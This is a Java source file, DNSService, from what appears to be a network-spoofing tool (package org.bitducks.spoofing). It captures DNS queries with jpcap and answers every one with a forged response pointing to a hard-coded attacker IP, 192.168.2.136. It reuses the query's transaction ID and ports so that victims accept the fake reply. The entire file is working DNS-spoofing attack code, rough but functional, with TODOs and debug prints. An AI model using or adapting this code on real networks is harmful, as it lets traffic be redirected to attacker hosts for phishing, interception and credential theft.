 package org.bitducks.spoofing.services;
 
 import java.net.InetAddress;
 import java.net.UnknownHostException;
 import java.nio.ByteBuffer;
 
 import jpcap.JpcapSender;
 import jpcap.packet.UDPPacket;
 
 import org.bitducks.spoofing.core.Server;
 import org.bitducks.spoofing.core.Service;
 import org.bitducks.spoofing.core.rules.DNSRule;
 import org.bitducks.spoofing.packet.DNSPacket;
 import org.bitducks.spoofing.packet.PacketFactory;
 
 import sun.security.jca.JCAUtil;
 
 public class DNSService extends Service {
 	private InetAddress falseIpAddr = null;
 	
 	public DNSService() {
 		
 		// TODO Add rule
 		this.getPolicy().addRule(new DNSRule());
 		
 		// TODO Get our IP or the IP provided
 		this.setDNSFalseIp("192.168.2.136");
 	}
 	
 	public void setDNSFalseIp(String falseHostIp) {
 		try {
 			this.falseIpAddr = InetAddress.getByName(falseHostIp);
 		} catch (UnknownHostException e) {
 			e.printStackTrace();
 		}		
 	}
 
 	@Override
 	public void run() {
 		
 		System.out.println("DNS Starting");
 		UDPPacket queryPaquet = null;
 		while ((queryPaquet = (UDPPacket)this.getNextPacket()) != null) {
 				
 				System.out.println("got dns paquet");
 				// Getting the query part of the packet
 				byte[] queryData = queryPaquet.data;
 				
 				System.out.println(queryData.length);
				System.out.println(queryData);
 				ByteBuffer queryBuffer = ByteBuffer.allocate(queryData.length - 54);
 				for (int i = 54; i < queryData.length; ++i) {
 					queryBuffer.put(queryData[i]);
 				}
 				
 				
 				DNSPacket answerPaquet = PacketFactory.dnsRequest(queryPaquet.dst_port, 
 						queryPaquet.src_port, 
 						queryPaquet.dst_ip, 
 						queryPaquet.src_ip, 
 						new byte[] { queryData[42], queryData[43] }, 
 						new byte[] { queryData[46], queryData[47] }, 
 						queryData, 
 						this.falseIpAddr);
 				
 				this.sendDNSPacket(answerPaquet);
 				
 		}		
 	}
 	
 	private void sendDNSPacket(DNSPacket packet) {
 		System.out.println("Sending Dns");
 		Server.getInstance().sendPacket(packet);
 	}
 
 }
